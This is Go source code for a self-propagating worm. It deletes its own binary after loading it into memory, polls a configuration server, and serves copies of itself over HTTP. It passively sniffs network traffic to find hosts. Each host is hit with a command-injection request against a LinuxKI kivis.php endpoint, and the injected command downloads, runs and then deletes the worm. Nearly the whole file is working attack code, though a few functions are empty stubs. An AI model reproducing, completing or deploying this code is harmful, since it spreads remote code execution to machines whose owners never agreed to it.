package main

import (
	"fmt"
	"bytes"
	"time"
	"os"
	"log"
	"unsafe"
	//"errors"
	"net"
	"net/http"
	"io/ioutil"
	"encoding/json"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/zbiljic/go-filelock"
)

type Config struct {
	port int
	filename string
	savepath string
	passive_scan_timeout int
	scan_arp_only bool
	remove bool
	config_refresh int
	adaptive_shell bool
}

var worm_file []byte
var conf Config
var raw_conf_file string

var conf_server_addr = "http://127.0.0.1:5555"
var smask = "255.255.255.255"
var stc = 0

func SetNilOnIf(v *interface{}) {
    *v = nil
}
func setNilPtr(p unsafe.Pointer) {
    *(**int)(p) = nil
}

func UpdateSTC(){
	if conf.remove {

	}
}

func PopulateWormFile(){
	var err error
	worm_file, err = os.ReadFile(os.Args[0])
	if err != nil {
		//os.Exit(stc)
	}
}

func RemoveWormFile(){
	os.Remove(os.Args[0])
}

func DownloadConfig() {
	resp, err := http.Get(conf_server_addr)
    if err != nil {
        log.Fatal(err)
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        log.Fatal(err)
    }
    raw_conf_file = string(body)
}

func PopulateConfig(){
	json.Unmarshal([]byte(raw_conf_file), &conf)
}

func ConfigDownloader(){
	for {
		DownloadConfig()
		go PopulateConfig()
		time.Sleep(time.Duration(conf.config_refresh)*time.Second)
	}
}

func SingleExecLock(){
	nflck, _ := filelock.New(".nflck")
	//var lck filelock.TryLockerSafe
	err := nflck.Lock()
	if err != nil {
		os.Exit(1)
	}
	defer nflck.Unlock()
}

func ServeItself(){
	addr := fmt.Sprintf(":%d", conf.port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		go http.ServeContent(rw, r, conf.filename, time.Now(), bytes.NewReader(worm_file))
	}))
}

func GetLocalIp() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ip := conn.LocalAddr().(*net.UDPAddr).IP
	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

func CreateWormServerURL() string {
	return fmt.Sprintf("http://%s:%d/%s", GetLocalIp(), conf.port, conf.filename)
}

func Stager() string {
	return fmt.Sprintf("wget -O %s %s && chmod +x %s && ./%s && rm %s",
						conf.savepath, CreateWormServerURL(),
						conf.savepath, conf.savepath, conf.savepath)
}

func ExploitLinuxKI(target string){
	http_ports := []string{"80", "8080", "8888"}
	vulnerable_path := "/linuxki/experimental/vis/kivis.php?type=kitrace&pid=15;" + Stager()
	for _, port := range http_ports {
		url := fmt.Sprintf("http://%s:%s/%s", target, port, vulnerable_path)
		http.Get(url)
	}
}

func HarvestHostsFromInterface(f func(string), iface string) {
	var snapshot_len int32 = 1024
	timeout := time.Duration(conf.passive_scan_timeout) * time.Second
	handler, _ := pcap.OpenLive(iface, snapshot_len, false, timeout)
	if conf.scan_arp_only {
		handler.SetBPFFilter("arp")
	}
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ip_layer := packet.Layer(layers.LayerTypeIPv4)
		if ip_layer != nil {
			ip, _ := ip_layer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != GetLocalIp() && source != smask {
				go f(source)
			}
			if destination != GetLocalIp() && destination != smask {
				go f(destination)
			}
		}
	}
}

func InitPassiveScan(f func(string)) {
	device_names := []string{}
	devices, err := pcap.FindAllDevs()
	if err != nil {
		panic(err)
	}
	for _, dev := range devices {
		device_names = append(device_names, dev.Name)
	}
	for _, device := range device_names {
		go HarvestHostsFromInterface(f, device)
	}
}

func AdaptiveShell(){

}

func main(){
	SingleExecLock()
	PopulateWormFile()
	RemoveWormFile()
	go ConfigDownloader()
	ServeItself()
	if conf.adaptive_shell {
		go AdaptiveShell()
	}
	InitPassiveScan(ExploitLinuxKI)
}
